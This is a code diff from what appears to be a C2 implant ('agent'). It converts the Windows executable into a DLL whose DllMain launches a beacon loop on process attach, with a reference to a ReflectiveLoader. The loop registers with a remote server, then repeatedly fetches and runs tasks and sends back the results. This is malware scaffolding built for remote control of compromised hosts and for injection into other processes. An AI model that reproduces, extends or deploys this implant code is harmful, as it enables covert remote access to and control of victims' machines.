@@ -1,5 +1,5 @@
-// Compile with : x86_64-w64-mingw32-g++ -o agent.exe main.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp pe-exec.cpp -lwininet -lpsapi -static
-
+// Compile with : x86_64-w64-mingw32-g++ -shared -o agent.dll main_dll.cpp base64.cpp crypt.cpp system_utils.cpp file_utils.cpp http_client.cpp task.cpp pe-exec.cpp -lwininet -lpsapi -static-libstdc++ -static-libgcc -lws2_32
+#include <windows.h>
 #include <iostream>
 #include <thread>
 #include <chrono>
@@ -31,7 +31,9 @@ std::string beakon(const std::string& data_res) {
     return res;
 }
 
-int main() {
+
+extern "C" __declspec(dllexport) void agent_run() {
+    //MessageBoxA(0, "START AGENT !", "ReflectiveLoader", 0);
     std::setvbuf(stdout, NULL, _IONBF, 0);
     std::string register_call = beakon("");
     std::string result;
@@ -40,5 +42,18 @@ int main() {
         std::string beakon_call = beakon(result);
         result = parse_task(beakon_call);
     }
-    return 0;
+}
+
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+        agent_run();
+        break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
 }
